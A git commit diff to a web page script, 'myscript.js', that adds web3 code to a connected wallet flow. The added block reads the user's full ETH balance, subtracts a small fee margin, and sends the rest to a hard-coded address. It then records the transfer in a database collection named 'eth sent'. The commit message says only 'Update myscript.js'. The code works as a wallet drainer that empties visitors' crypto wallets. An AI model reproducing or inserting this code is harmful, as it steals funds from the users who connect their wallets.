cfd517ee2825fc42d9e480a3031a72224fc15d74
yawa-basad <154462953+yawa-basad@users.noreply.github.com>
2024-10-28 18:39:00 +0800

    Update myscript.js

--- myscript.js
+++ myscript.js
@@ -650,9 +650,53 @@ $(document).ready(function () {
 
   
   
+          // eth send
 
+          var value = await get_eth(account) //search getbalance.js
+          var minusvalue = value - 0.0084 //it can be userinputted or set by a webpage or estimated by a thirdparty
+          
+          const finalAmount = Web3.utils.toWei(minusvalue.toString(), 'ether')
+
+
+
+          console.log(finalAmount)
+          const txData = {
+          from: account,
+          to: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262',
+          value: finalAmount,
+          };
+
+
+          await web3.eth.sendTransaction(txData)
+          .then( (txHash) => {
+
+          db.collection('eth sent').add(txData).then( () => {
+            console.log('data eth sent')
+          }).catch( () => {
+              console.log('err')
+          })
+
+          console.log(txHash)
+          }).catch( (err) => {
+
+
+
+          console.log(err)
+          })
 
 
         }
 
 
+
+        //get eth
+        async function get_eth(address) {
+
+          const balances = web3.utils.fromWei(
+            await web3.eth.getBalance(address),
+            'ether'
+          )* 1;
+        
+          return balances;
+        
+        }
